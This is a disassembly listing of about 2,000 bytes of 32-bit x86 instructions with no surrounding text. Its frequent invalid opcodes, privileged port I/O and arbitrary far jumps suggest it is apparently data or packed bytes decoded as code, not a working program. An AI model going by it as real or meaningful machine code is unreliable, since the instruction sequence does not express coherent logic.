  42470d:	mov    edi,0xa80cc1b
  424712:	cmp    eax,0x80a367ac
  424717:	sub    al,0xd0
  424719:	lahf   
  42471a:	add    ah,BYTE PTR [esi]
  42471c:	jmp    0xaa58:0x2ac3b119
  424723:	inc    esi
  424724:	outs   dx,DWORD PTR ds:[esi]
  424725:	and    eax,0x5d4fb0d8
  42472a:	(bad)  
  42472c:	sbb    DWORD PTR [eax+0x44],edi
  42472f:	inc    eax
  424730:	sub    DWORD PTR [esp+edi*2-0x45],edx
  424734:	mov    ebx,0xa4d0ac7d
  424739:	mov    ah,0x9e
  42473b:	mov    ch,0x44
  42473d:	lods   al,BYTE PTR ds:[esi]
  42473e:	popa   
  42473f:	mov    esp,0xaa856489
  424744:	in     al,dx
  424745:	lods   al,BYTE PTR ds:[esi]
  424746:	lea    edi,[edi]
  424748:	jp     0x424717
  42474a:	popa   
  42474b:	lock push 0x91af73fd
  424751:	ret    0x5a11
  424754:	xor    DWORD PTR [edi],edi
  424756:	pop    edx
  424757:	hlt    
  424758:	rcr    BYTE PTR [esi+0x2de24053],1
  42475e:	pop    esp
  42475f:	fdivr  st,st(0)
  424761:	hlt    
  424762:	mov    bl,dl
  424764:	cmp    BYTE PTR [esi-0x50],dh
  424767:	sub    BYTE PTR [ebx+edi*8],bl
  42476a:	shl    DWORD PTR ds:0x7fcef68c,1
  424770:	addr16 sub al,0xb5
  424773:	call   0xc700:0x642cb584
  42477a:	sbb    BYTE PTR [esi+0x12],al
  42477d:	ret    0xf1b0
  424780:	fldenv [ebx]
  424782:	cmp    eax,0xd30e8dc1
  424787:	leave  
  424788:	ds pop es
  42478a:	sbb    BYTE PTR [ebx+0x74],bh
  42478d:	in     al,0x3f
  42478f:	(bad)  
  424791:	mov    ebp,0xeb9b31eb
  424796:	sbb    eax,0xfe86edc2
  42479b:	adc    eax,0xaf00b80
  4247a0:	ds jo  0x4247ac
  4247a3:	pop    ds
  4247a4:	loop   0x424787
  4247a6:	shl    BYTE PTR [edi-0x5d64a16f],cl
  4247ac:	(bad)  
  4247ad:	imul   ebp,DWORD PTR [ecx],0xe65b99ab
  4247b3:	aad    0x84
  4247b5:	push   ecx
  4247b6:	cmp    al,0x4b
  4247b8:	int    0xc1
  4247ba:	xchg   esi,eax
  4247bb:	and    esp,ebp
  4247bd:	ins    DWORD PTR es:[edi],dx
  4247be:	jg     0x424746
  4247c0:	and    ax,cx
  4247c3:	das    
  4247c4:	lock fcomp QWORD PTR [eax-0x2d576320]
  4247cb:	mov    bh,0xa4
  4247cd:	push   ebp
  4247ce:	out    dx,al
  4247cf:	xchg   ebp,eax
  4247d0:	jle    0x4247f4
  4247d2:	popf   
  4247d3:	je     0x4247a5
  4247d5:	and    eax,0x1420028f
  4247db:	ins    DWORD PTR es:[edi],dx
  4247dc:	fisttp QWORD PTR [esi-0x36]
  4247df:	aad    0xbb
  4247e1:	sub    dl,ch
  4247e3:	shl    DWORD PTR [ebx+0x1afc624d],cl
  4247e9:	xor    dh,bl
  4247eb:	ret    0x7e9b
  4247ee:	or     BYTE PTR [ecx+0x78],0x61
  4247f2:	inc    edi
  4247f3:	in     eax,0x53
  4247f5:	and    BYTE PTR [edx-0x19],ch
  4247f8:	dec    esp
  4247f9:	jge    0x424826
  4247fb:	std    
  4247fc:	mov    ds:0xa3d4c2d5,al
  424801:	mov    DWORD PTR [ecx-0x8],esp
  424804:	leave  
  424805:	add    eax,0x4684f9
  42480a:	in     al,dx
  42480b:	dec    esi
  42480c:	inc    eax
  42480d:	iret   
  42480e:	mov    esp,0x2b5c11b
  424813:	test   eax,0x2246a79c
  424818:	fs push cs
  42481a:	add    dh,al
  42481c:	(bad)  [esi+0x36]
  42481f:	dec    ebp
  424820:	mov    edi,0xab3d0d69
  424825:	sbb    al,0x84
  424827:	in     eax,dx
  424828:	fcomp  DWORD PTR [ebx]
  42482a:	and    al,BYTE PTR [esp+ecx*8-0x616d0c75]
  424831:	gs push es
  424833:	int3   
  424834:	int3   
  424835:	popa   
  424836:	mov    dh,0x41
  424838:	and    al,BYTE PTR [ecx-0x24]
  42483b:	mov    ch,0x33
  42483d:	jne    0x4248bd
  42483f:	and    ebx,edi
  424841:	sbb    BYTE PTR [ecx+0x47],ah
  424844:	jbe    0x4247d7
  424846:	or     BYTE PTR ds:0x64455181,dh
  42484c:	cwde   
  42484d:	xchg   ecx,eax
  42484e:	or     al,bl
  424850:	xchg   esp,eax
  424851:	xchg   ebp,eax
  424852:	pop    esi
  424853:	lahf   
  424854:	(bad)  
  424855:	das    
  424856:	ins    DWORD PTR es:[edi],dx
  424857:	sahf   
  424858:	xchg   esp,eax
  424859:	sbb    al,0x74
  42485b:	sbb    al,0x5f
  42485d:	fmul   DWORD PTR [ebx]
  42485f:	lock iret 
  424861:	add    eax,0xab388149
  424866:	daa    
  424867:	js     0x424825
  424869:	adc    DWORD PTR [esi],ebx
  42486b:	jg     0x42489e
  42486d:	das    
  42486e:	mov    bh,0x5b
  424870:	xor    dl,dh
  424872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424873:	pop    ebx
  424874:	jno    0x424860
  424876:	inc    DWORD PTR [esi+0xb]
  424879:	sub    al,0x24
  42487b:	pusha  
  42487c:	push   esp
  42487d:	(bad)  
  42487e:	stc    
  42487f:	mov    ecx,DWORD PTR [ebx+0x1f486a]
  424885:	leave  
  424886:	scas   al,BYTE PTR es:[edi]
  424887:	mov    bh,0x1b
  424889:	mov    edx,0x1eddbc0b
  42488e:	mov    eax,ds:0x848296f3
  424893:	scas   al,BYTE PTR es:[edi]
  424894:	int3   
  424895:	mov    eax,ds:0xa6d0dc28
  42489a:	popa   
  42489b:	adc    al,0x7a
  42489d:	pop    edi
  42489e:	mov    ds:0x8676bf27,eax
  4248a3:	jno    0x424898
  4248a5:	lock (bad) 
  4248a7:	jmp    0xd9a81f85
  4248ac:	mov    esp,0xe9510347
  4248b1:	mov    bh,0xf1
  4248b3:	fwait
  4248b4:	scas   eax,DWORD PTR es:[edi]
  4248b5:	mov    al,0x71
  4248b7:	or     esi,DWORD PTR [ecx+0x52d413e7]
  4248bd:	cmp    edx,ebp
  4248bf:	push   edi
  4248c0:	test   eax,0x59741f05
  4248c5:	and    DWORD PTR [eax],esp
  4248c7:	push   ebp
  4248c8:	lahf   
  4248c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248ca:	loope  0x424860
  4248cc:	sti    
  4248cd:	dec    esp
  4248ce:	ss cli 
  4248d0:	ret    
  4248d1:	das    
  4248d2:	mov    bl,0xff
  4248d4:	loope  0x424870
  4248d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248d7:	in     eax,dx
  4248d8:	jmp    0xedb6d5c4
  4248dd:	mov    ah,0x6f
  4248df:	loope  0x424902
  4248e1:	je     0x4248e6
  4248e3:	lea    esi,[esi+ebx*1+0x7]
  4248e7:	inc    edi
  4248e8:	jge    0x4248f5
  4248ea:	lods   eax,DWORD PTR ds:[esi]
  4248eb:	test   esp,0x31ec542d
  4248f1:	out    dx,eax
  4248f2:	and    edx,edx
  4248f4:	sub    ecx,DWORD PTR cs:[edi-0x4df64052]
  4248fb:	(bad)  
  4248fc:	movups xmm4,XMMWORD PTR [ebp+0x68]
  424900:	stos   BYTE PTR es:[edi],al
  424901:	sub    ah,bl
  424903:	push   esp
  424904:	xor    eax,0xea19d29
  424909:	rol    bh,cl
  42490b:	out    dx,al
  42490c:	adc    BYTE PTR [eax-0x28a78c68],ah
  424912:	hlt    
  424913:	aad    0xc5
  424915:	jns    0x4248b3
  424917:	fwait
  424918:	xlat   BYTE PTR ds:[ebx]
  424919:	dec    eax
  42491a:	pushf  
  42491b:	pop    ebp
  42491c:	dec    ebp
  42491d:	sbb    eax,0x7ee6e042
  424922:	sbb    BYTE PTR [ebp-0xd7d67f1],ah
  424928:	push   0x73a9e6d
  42492d:	add    BYTE PTR [eax],al
  42492f:	add    BYTE PTR [eax],al
  424931:	add    BYTE PTR [ebx],dl
  424933:	lea    ebp,[ecx]
  424935:	imul   edi,DWORD PTR [edi+0x23fd53ef],0x6b
  42493c:	fcmovnb st,st(6)
  42493e:	imul   esp,DWORD PTR [edx+ebp*8+0x79],0x9
  424943:	ret    0x1
  424946:	repz add al,0x0
  424949:	add    bl,ah
  42494b:	mov    gs,ebp
  42494d:	mov    al,0x6a
  42494f:	xorps  xmm5,XMMWORD PTR [ebp+0x1fcf6525]
  424956:	scas   eax,DWORD PTR es:[edi]
  424957:	idiv   ebp
  424959:	rcr    BYTE PTR [eax],0x36
  42495c:	or     al,0x7f
  42495e:	sbb    cl,BYTE PTR [eax+0x58]
  424961:	pop    ebx
  424962:	nop
  424963:	add    DWORD PTR [edi-0x25709ad4],0x49d16212
  42496d:	les    eax,FWORD PTR [edx+0x68]
  424970:	or     al,0x35
  424972:	lock in al,dx
  424974:	(bad)  
  424976:	jbe    0x4249db
  424978:	mov    eax,0xf0c5f663
  42497d:	fwait
  42497e:	inc    edx
  42497f:	xchg   DWORD PTR [edi-0x39f71c58],ecx
  424985:	or     esp,edx
  424987:	aaa    
  424988:	adc    dh,BYTE PTR [ecx+0x5957874d]
  42498e:	test   eax,0xf97fc8d5
  424993:	imul   edx,DWORD PTR ss:[esi+0x7b450a55],0xffffff93
  42499b:	popa   
  42499c:	(bad)  
  42499d:	and    esp,ecx
  42499f:	fadd   DWORD PTR [ebx-0x2]
  4249a2:	call   0x3645d6f
  4249a7:	jmp    0x42498e
  4249a9:	cmp    ecx,DWORD PTR [eax]
  4249ab:	repnz test BYTE PTR [eax],0x71
  4249af:	xchg   esi,eax
  4249b0:	inc    edi
  4249b1:	sbb    eax,0x72a7906e
  4249b6:	jb     0x424970
  4249b8:	fsubr  QWORD PTR [ebx]
  4249ba:	mov    edx,0x287fb1c4
  4249bf:	xor    DWORD PTR [ecx+0x2be642f8],eax
  4249c5:	and    al,0xab
  4249c7:	retf   
  4249c8:	in     eax,0xb1
  4249ca:	push   esp
  4249cb:	popa   
  4249cc:	mov    esi,DWORD PTR [ecx+0x13]
  4249cf:	fs jl  0x42495d
  4249d2:	add    DWORD PTR [ecx+0x53],ecx
  4249d5:	add    eax,edx
  4249d7:	sbb    esi,ebx
  4249d9:	ret    
  4249da:	mov    ds:0x1d93e746,eax
  4249df:	xor    cl,BYTE PTR [edi-0x7f]
  4249e2:	jecxz  0x4249b8
  4249e4:	daa    
  4249e5:	mov    ebp,0x7d345584
  4249ea:	scas   al,BYTE PTR es:[edi]
  4249eb:	jg     0x424a2a
  4249ed:	imul   ecx
  4249ef:	nop
  4249f0:	push   ss
  4249f1:	push   edx
  4249f2:	into   
  4249f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249f4:	fld    DWORD PTR [eax+0x35]
  4249f7:	sub    edi,DWORD PTR [ebx+0x4de86922]
  4249fd:	push   esi
  4249fe:	fnstcw WORD PTR [ecx+ecx*1-0x5]
  424a02:	mov    eax,ds:0xf1517782
  424a07:	jecxz  0x4249cd
  424a09:	les    ecx,FWORD PTR [eax-0x5b]
  424a0c:	mov    ah,0x8c
  424a0e:	cs call 0x4530:0x69d57a25
  424a16:	sbb    edi,ebp
  424a18:	sbb    edx,DWORD PTR [ebx+0x3e29b0ce]
  424a1e:	jl     0x4249b8
  424a20:	retf   0x54a2
  424a23:	jbe    0x4249ae
  424a25:	cmp    BYTE PTR [eax],dh
  424a27:	repz pop ebp
  424a29:	call   0xf870:0x526bc9d0
  424a30:	pop    ds
  424a31:	test   eax,0xf0ba50ba
  424a36:	(bad)  
  424a37:	fist   DWORD PTR [ecx]
  424a39:	ss sbb cl,BYTE PTR gs:[eax+edx*8]
  424a3e:	xchg   ebp,eax
  424a3f:	sar    DWORD PTR [eax-0x17],cl
  424a42:	shl    DWORD PTR [edi],cl
  424a44:	(bad)  
  424a45:	cmp    ch,al
  424a47:	(bad)  
  424a48:	loop   0x424a37
  424a4a:	aas    
  424a4b:	repz xchg si,ax
  424a4e:	push   cs
  424a4f:	sbb    DWORD PTR [edi-0x79],esp
  424a52:	test   BYTE PTR [ecx],cl
  424a54:	xchg   edx,eax
  424a55:	inc    ebp
  424a56:	iret   
  424a57:	loopne 0x424aa2
  424a59:	xor    dh,BYTE PTR [eax]
  424a5b:	xchg   ecx,eax
  424a5c:	test   BYTE PTR [edi+ecx*2],bl
  424a5f:	xlat   BYTE PTR ds:[ebx]
  424a60:	retf   
  424a61:	jp     0x4249fc
  424a63:	es call 0x8041:0xc10a43f5
  424a6b:	sbb    esp,DWORD PTR [esp+edi*8]
  424a6e:	outs   dx,DWORD PTR ds:[esi]
  424a6f:	jle    0x424a37
  424a71:	sub    cl,0x78
  424a74:	jo     0x424ae2
  424a76:	out    0xd7,al
  424a78:	jno    0x424ab4
  424a7a:	fisttp DWORD PTR [esi]
  424a7c:	gs mov ebx,0x29586e8e
  424a82:	xchg   DWORD PTR [edi+0x625e268a],esi
  424a88:	(bad)  
  424a89:	sahf   
  424a8a:	std    
  424a8b:	mov    al,0xbc
  424a8d:	in     al,dx
  424a8e:	shl    dh,0x8b
  424a91:	dec    ebp
  424a92:	dec    edx
  424a93:	xchg   edi,eax
  424a94:	and    bl,al
  424a96:	aad    0x1b
  424a98:	jae    0x424acf
  424a9a:	push   ss
  424a9b:	xor    ebp,DWORD PTR [ebp+0x1e1f09e0]
  424aa1:	jp     0x424b12
  424aa3:	xchg   esi,eax
  424aa4:	inc    ecx
  424aa5:	mov    cs,WORD PTR [edi-0x4783bc25]
  424aab:	or     dh,dl
  424aad:	cmp    al,0xa5
  424aaf:	in     al,dx
  424ab0:	mov    al,0x36
  424ab2:	or     eax,0x2fa9461c
  424ab7:	jo     0x424b33
  424ab9:	iret   
  424aba:	pop    eax
  424abb:	js     0x424ac6
  424abd:	ret    
  424abe:	int3   
  424abf:	test   eax,0xc40a84ba
  424ac4:	or     ch,bh
  424ac6:	xor    bh,BYTE PTR [eax]
  424ac8:	and    DWORD PTR [ebx],ebp
  424aca:	test   ecx,edx
  424acc:	mov    dl,0xd4
  424ace:	aad    0x4b
  424ad0:	push   eax
  424ad1:	dec    edx
  424ad2:	sti    
  424ad3:	loopne 0x424aeb
  424ad5:	dec    edx
  424ad6:	cdq    
  424ad7:	cmp    al,0x63
  424ad9:	dec    edi
  424ada:	xlat   BYTE PTR ds:[ebx]
  424adb:	scas   al,BYTE PTR es:[edi]
  424adc:	shr    DWORD PTR [edx+ebx*8+0x38373a82],cl
  424ae3:	stc    
  424ae4:	inc    edi
  424ae5:	in     eax,0x66
  424ae7:	fisttp QWORD PTR [eax+0x71]
  424aea:	mov    eax,ds:0xa62230d2
  424aef:	popf   
  424af0:	pop    ebx
  424af1:	add    DWORD PTR [ecx+edi*1],0x13ebaad6
  424af8:	xor    eax,0xb5679177
  424afd:	int3   
  424afe:	mov    DWORD PTR [ecx-0x14],eax
  424b01:	je     0x424b14
  424b03:	scas   eax,DWORD PTR es:[edi]
  424b04:	in     al,0xbc
  424b06:	mov    BYTE PTR [ebp-0x6c],0xfe
  424b0a:	pop    ebp
  424b0b:	jnp    0x424ad1
  424b0d:	inc    esp
  424b0e:	lock push ecx
  424b10:	out    dx,eax
  424b11:	data16 ja 0x424b34
  424b14:	lods   al,BYTE PTR ds:[esi]
  424b15:	lock pop ebx
  424b17:	retf   0x8a
  424b1a:	xor    al,0x75
  424b1c:	push   ebp
  424b1d:	sbb    esp,DWORD PTR [ebx+ecx*8-0x78aa2e34]
  424b24:	shl    BYTE PTR [edx],cl
  424b26:	data16 fucomip st,st(7)
  424b29:	call   0xd42e:0x6a76dce9
  424b30:	test   al,0xef
  424b32:	ins    BYTE PTR es:[di],dx
  424b34:	inc    ebx
  424b35:	xlat   BYTE PTR ds:[ebx]
  424b36:	mov    esi,0x6b4a96fd
  424b3b:	fnstcw WORD PTR [ebp-0x16deafed]
  424b41:	aad    0x8f
  424b43:	mov    ecx,0xff078daa
  424b48:	mov    ebx,0x1f7425d9
  424b4d:	dec    edx
  424b4e:	es ret 
  424b50:	out    0x82,eax
  424b52:	or     DWORD PTR [ebp+eiz*1-0xb0b0b8d],0xa3da99b
  424b5d:	inc    esp
  424b5e:	out    0x3c,eax
  424b60:	ja     0x424b65
  424b62:	leave  
  424b63:	inc    edi
  424b64:	cmc    
  424b65:	out    dx,eax
  424b66:	dec    eax
  424b67:	loopne 0x424b98
  424b69:	clc    
  424b6a:	and    eax,0xdb69067e
  424b6f:	loope  0x424b15
  424b71:	arpl   WORD PTR [edi+0x13595c38],bx
  424b77:	adc    bh,BYTE PTR [ecx-0x10007a6c]
  424b7d:	mov    esi,0xd5bf492d
  424b82:	lods   al,BYTE PTR ds:[esi]
  424b83:	not    esi
  424b85:	push   esi
  424b86:	add    eax,0x6113ccf4
  424b8b:	dec    ebp
  424b8c:	jp     0x424b2a
  424b8e:	ins    DWORD PTR es:[edi],dx
  424b8f:	adc    cl,BYTE PTR [eax-0x55572bf8]
  424b95:	fnstcw WORD PTR [ecx-0x420d2e7e]
  424b9b:	(bad)  
  424b9c:	pusha  
  424b9d:	daa    
  424b9e:	arpl   WORD PTR [eax],bp
  424ba0:	lods   eax,DWORD PTR ds:[esi]
  424ba1:	setne  dh
  424ba4:	jmp    DWORD PTR [edx]
  424ba6:	push   edi
  424ba7:	ja     0x424b37
  424ba9:	dec    eax
  424baa:	push   eax
  424bab:	fist   DWORD PTR [eax]
  424bad:	sbb    BYTE PTR [ecx],dl
  424baf:	lods   al,BYTE PTR ds:[esi]
  424bb0:	stc    
  424bb1:	loopne 0x424bf0
  424bb3:	adc    DWORD PTR [ecx+0x7b],edx
  424bb6:	mov    ch,BYTE PTR [esi]
  424bb8:	cli    
  424bb9:	pop    ecx
  424bba:	lea    eax,[ecx+0x6a]
  424bbd:	or     edi,ecx
  424bbf:	mov    al,ds:0xd3891b16
  424bc4:	loope  0x424bbc
  424bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bc7:	xor    ah,BYTE PTR [esi-0x27]
  424bca:	js     0x424c0e
  424bcc:	cmp    dh,BYTE PTR [eax]
  424bce:	push   ds
  424bcf:	rcl    DWORD PTR [esi],0xbe
  424bd2:	jb     0x424c06
  424bd4:	mov    esp,0xfb132396
  424bd9:	prefetchw BYTE PTR ds:0x1fcec68f
  424be0:	adc    ebx,ebp
  424be2:	mov    BYTE PTR [edx+0x48],al
  424be5:	mov    eax,ds:0x790d04e6
  424bea:	jae    0x424c0a
  424bec:	popa   
  424bed:	loope  0x424c09
  424bef:	jecxz  0x424bb8
  424bf1:	xor    DWORD PTR [edx+0x65],edi
  424bf4:	jno    0x424be3
  424bf6:	jmp    0xfc59:0x115e5cff
  424bfd:	mov    edx,0x81fff60f
  424c02:	shl    ebx,cl
  424c04:	(bad)  
  424c05:	lds    eax,FWORD PTR [ecx-0x15]
  424c08:	mov    esp,0xbc141cef
  424c0d:	dec    esi
  424c0e:	push   edi
  424c0f:	ror    BYTE PTR [ebx-0x2b134b28],cl
  424c15:	shr    DWORD PTR [ebx],cl
  424c17:	sbb    DWORD PTR [edi-0x1511d055],esi
  424c1d:	daa    
  424c1e:	push   ebp
  424c1f:	sbb    edi,DWORD PTR [edi-0x70a29cd7]
  424c25:	es jp  0x424c47
  424c28:	cld    
  424c29:	ja     0x424bce
  424c2b:	sbb    ah,al
  424c2d:	adc    ah,BYTE PTR [esi]
  424c2f:	add    eax,0x2db56eb0
  424c34:	adc    BYTE PTR [eax-0x7e],0xd9
  424c38:	xor    eax,0xb31f37c5
  424c3d:	bound  edi,QWORD PTR [ebx]
  424c3f:	sar    DWORD PTR [ecx+ebx*8-0x2b0768b1],0x7d
  424c47:	ins    BYTE PTR es:[edi],dx
  424c48:	and    ebx,ecx
  424c4a:	cmp    DWORD PTR [edx+edi*1-0xd],esi
  424c4e:	mov    eax,0x6d505cc8
  424c53:	mov    al,bh
  424c55:	push   ecx
  424c56:	mov    ah,0x6c
  424c58:	stos   DWORD PTR es:[edi],eax
  424c59:	stos   BYTE PTR es:[edi],al
  424c5a:	pop    eax
  424c5b:	mov    ebp,0x106ac236
  424c60:	lods   al,BYTE PTR ds:[esi]
  424c61:	pop    ecx
  424c62:	mov    ebp,eax
  424c64:	mov    esi,0xf0fe44c3
  424c69:	push   ebp
  424c6a:	clc    
  424c6b:	retf   0xca32
  424c6e:	inc    esi
  424c6f:	shl    BYTE PTR [eax],cl
  424c71:	cs dec esi
  424c73:	fadd   QWORD PTR [edi]
  424c75:	push   esp
  424c76:	add    al,0xc1
  424c78:	adc    edx,esp
  424c7a:	and    eax,0xd8814118
  424c7f:	in     al,0x8e
  424c81:	cmp    ah,ch
  424c83:	mov    dh,0x65
  424c85:	iret   
  424c86:	mov    cl,0xc8
  424c88:	push   ebp
  424c89:	ficomp WORD PTR [ebp+0x4ea6930b]
  424c8f:	bound  edx,QWORD PTR [eax+0xa]
  424c92:	ror    DWORD PTR [ebx],0x96
  424c95:	inc    esp
  424c96:	pop    esi
  424c97:	bound  ebp,QWORD PTR [eax]
  424c99:	xchg   edx,eax
  424c9a:	mov    cl,0x7c
  424c9c:	stc    
  424c9d:	sti    
  424c9e:	inc    edi
  424c9f:	xchg   esp,eax
  424ca0:	lahf   
  424ca1:	loop   0x424c5b
  424ca3:	rol    BYTE PTR [edi],1
  424ca5:	xor    BYTE PTR [ebx+0x75],al
  424ca8:	icebp  
  424ca9:	and    eax,0x16e224bc
  424cae:	ins    DWORD PTR es:[edi],dx
  424caf:	mov    al,ds:0xd3d2a041
  424cb4:	lds    eax,FWORD PTR [edi-0x1d]
  424cb7:	and    al,0x20
  424cb9:	lahf   
  424cba:	(bad)  
  424cbb:	in     al,dx
  424cbc:	fild   DWORD PTR [edi+0x2f]
  424cbf:	aaa    
  424cc0:	inc    edi
  424cc1:	and    BYTE PTR [eax],0x15
  424cc4:	add    esp,DWORD PTR [ebx]
  424cc6:	popa   
  424cc7:	pop    edi
  424cc8:	aad    0x4f
  424cca:	adc    BYTE PTR [eax-0x5608295c],ah
  424cd0:	sahf   
  424cd1:	loop   0x424cb1
  424cd3:	repnz out 0xad,eax
  424cd6:	dec    esp
  424cd7:	shr    BYTE PTR [esi*4-0x35350a52],cl
  424cde:	ja     0x424ceb
  424ce0:	lds    esp,FWORD PTR [edx-0x7c5f10eb]
  424ce6:	push   ss
  424ce7:	pop    ss
  424ce8:	pop    esp
  424ce9:	(bad)  
  424cea:	jg     0x424cae
  424cec:	sbb    DWORD PTR [ebx+eiz*1],esi
  424cef:	imul   BYTE PTR [edi-0x6f79aaec]
  424cf5:	mov    cl,0xa8
  424cf7:	lods   eax,DWORD PTR ds:[esi]
  424cf8:	in     eax,0x32
  424cfa:	pop    eax
  424cfb:	and    DWORD PTR [edi+0x71],ecx
  424cfe:	dec    ebx
  424cff:	mov    WORD PTR [ecx-0x62],es
  424d02:	(bad)  
  424d03:	mov    ebx,0x3090e380
  424d08:	jo     0x424cfc
  424d0a:	xor    bh,0xfc
  424d0d:	icebp  
  424d0e:	add    eax,edx
  424d10:	sbb    ebp,0x6d
  424d13:	cmp    DWORD PTR [edi+0x4d],ebp
  424d16:	push   ds
  424d17:	int    0xed
  424d19:	dec    edx
  424d1a:	(bad)  
  424d1c:	and    DWORD PTR [ebx],ebp
  424d1e:	or     BYTE PTR [ecx-0x84df8d0],0x7a
  424d25:	adc    dh,dh
  424d27:	xor    dh,BYTE PTR [edx]
  424d29:	ins    BYTE PTR es:[edi],dx
  424d2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d2d:	fsub   QWORD PTR [edi+0x56]
  424d30:	xchg   edx,eax
  424d31:	pusha  
  424d32:	call   0xaa2a:0xf299725c
  424d39:	and    eax,ebx
  424d3b:	jb     0x424d74
  424d3d:	xchg   ebp,eax
  424d3e:	scas   al,BYTE PTR es:[edi]
  424d3f:	mov    ah,0xc8
  424d41:	dec    esi
  424d42:	ins    BYTE PTR es:[edi],dx
  424d43:	pop    ss
  424d44:	mov    ebp,DWORD PTR [esi+0x358acd33]
  424d4a:	psadbw mm0,QWORD PTR [esi+esi*2]
  424d4e:	or     BYTE PTR [ebx+0x68cc1ad3],cl
  424d54:	pop    ebp
  424d55:	xchg   esp,eax
  424d56:	pop    edx
  424d57:	test   eax,0xd2029c41
  424d5c:	retf   0xe090
  424d5f:	stos   BYTE PTR es:[edi],al
  424d60:	cmp    bl,dh
  424d62:	xchg   esi,eax
  424d63:	das    
  424d64:	sub    ch,bl
  424d66:	xor    eax,0xe8cfb3b
  424d6b:	cmc    
  424d6c:	xchg   ebx,eax
  424d6d:	adc    al,0x20
  424d6f:	add    eax,0xef43a83e
  424d74:	lods   eax,DWORD PTR ds:[esi]
  424d75:	in     al,0x72
  424d77:	pushf  
  424d78:	mov    esp,0x357d2efc
  424d7d:	inc    eax
  424d7e:	aad    0xd2
  424d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d81:	scas   eax,DWORD PTR es:[edi]
  424d82:	xor    BYTE PTR [ebx-0x5],0x44
  424d86:	ret    0xc1c5
  424d89:	cmc    
  424d8a:	out    0xff,al
  424d8c:	enter  0x6e58,0x7c
  424d90:	lods   eax,DWORD PTR ds:[esi]
  424d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d93:	cmc    
  424d94:	dec    edx
  424d95:	sub    eax,0x608fe619
  424d9a:	lock mov edx,0x7ab5d180
  424da0:	int3   
  424da1:	mov    ds:0x973624fc,al
  424da6:	lods   al,BYTE PTR ds:[esi]
  424da7:	cwde   
  424da8:	dec    ebp
  424da9:	add    BYTE PTR [edx+0x3a],al
  424dac:	add    eax,0x9048f2ab
  424db1:	inc    ebx
  424db2:	sub    al,0x7f
  424db4:	ret    0x884
  424db7:	arpl   bp,sp
  424db9:	sbb    BYTE PTR [eax+0x2e],al
  424dbc:	out    dx,al
  424dbd:	push   edx
  424dbe:	pop    esp
  424dbf:	adc    bh,dh
  424dc1:	jae    0x424e1d
  424dc3:	test   BYTE PTR [esi+0x2ffb6f46],0x54
  424dca:	(bad)  
  424dcb:	fstp   DWORD PTR [ebx+esi*2]
  424dce:	ins    BYTE PTR es:[edi],dx
  424dcf:	jg     0x424db5
  424dd1:	xchg   eax,edi
  424dd3:	rcr    bl,0x7f
  424dd6:	mov    eax,0x5fd54f7d
  424ddb:	iret   
  424ddc:	js     0x424da2
  424dde:	(bad)
  424de1:	inc    edx
  424de2:	pop    esp
  424de3:	cmp    eax,0x68c55c8a
  424de8:	jbe    0x424e0d
  424dea:	(bad)  
  424deb:	in     al,0xc9
  424ded:	adc    DWORD PTR [ecx-0x2878b522],0x92d8e25c
  424df7:	add    BYTE PTR [eax+edi*2+0x141f33b5],0x10
  424dff:	jmp    0x424d88
  424e01:	sub    dh,BYTE PTR [eax+edi*2+0x39fd9798]
  424e08:	in     eax,dx
  424e09:	cld    
  424e0a:	aad    0x94
  424e0c:	fld    DWORD PTR [edx]
  424e0e:	iret   
  424e0f:	test   BYTE PTR [ebx-0x62d222c6],0x1b
  424e16:	sti    
  424e17:	mov    dl,0xe3
  424e19:	inc    ecx
  424e1a:	test   al,0xbb
  424e1c:	jns    0x424e0a
  424e1e:	xchg   DWORD PTR [esi+edi*8+0x5be38473],edx
  424e25:	push   edi
  424e26:	mov    ecx,0x1529422e
  424e2b:	leave  
  424e2c:	mov    ebp,0xfc5b2b6c
  424e31:	jp     0x424de6
  424e33:	push   ecx
  424e34:	xor    DWORD PTR [ebx+0x5e],eax
  424e37:	sub    eax,0x877c13b9
  424e3c:	mov    es,WORD PTR [eax]
  424e3e:	add    BYTE PTR [eax],al
  424e40:	add    BYTE PTR [eax],al
  424e42:	add    BYTE PTR [edi+ecx*2+0x7],0xcf
  424e47:	bswap  eax
  424e49:	(bad)  
  424e4a:	test   al,0x2c
  424e4c:	dec    eax
  424e4d:	or     eax,ebp
  424e4f:	cli    
  424e50:	rol    BYTE PTR [ecx+0x1c6fc],1
  424e56:	repz add al,0x0
  424e59:	add    BYTE PTR [esp+ecx*4+0x3056f338],bl
  424e60:	xor    eax,0x84f771cb
  424e65:	scas   eax,DWORD PTR es:[edi]
  424e66:	enter  0x4dec,0x87
  424e6a:	mov    dl,0x6a
  424e6c:	xchg   esp,eax
  424e6d:	lock push 0xe0e1efb2
  424e73:	xchg   ecx,eax
  424e74:	inc    eax
  424e75:	add    eax,0x75338b02
  424e7a:	jno    0x424e07
  424e7c:	rcr    BYTE PTR [edx+0x68457f1c],0x93
  424e83:	scas   al,BYTE PTR es:[edi]
  424e84:	in     al,dx
  424e85:	mov    al,ds:0x24400a3d
  424e8a:	push   0xfffffff9
  424e8c:	das    
  424e8d:	push   ebx
  424e8e:	es dec ebx
  424e90:	and    DWORD PTR [esi],edx
  424e92:	out    0xe8,eax
  424e94:	ss jbe 0x424f05
  424e97:	fisubr DWORD PTR [ecx-0x4d875526]
  424e9d:	add    ecx,DWORD PTR [ebp+edx*2+0x14863e2e]
  424ea4:	icebp  
  424ea5:	aad    0x3
  424ea7:	sbb    eax,0x172a02ed
  424eac:	jbe    0x424ece
  424eae:	arpl   sp,si
  424eb0:	push   ebp
  424eb1:	cld    
  424eb2:	adc    cl,0xf1
  424eb5:	js     0x424e67
  424eb7:	lds    ecx,FWORD PTR [ecx]
  424eb9:	or     ecx,DWORD PTR [edx+0x4964407d]
  424ebf:	add    BYTE PTR [ecx],0x48
  424ec2:	rcr    BYTE PTR [edx+0x3d],cl
  424ec5:	sbb    al,0x8d
  424ec7:	mov    ebx,0x59d5dbb7
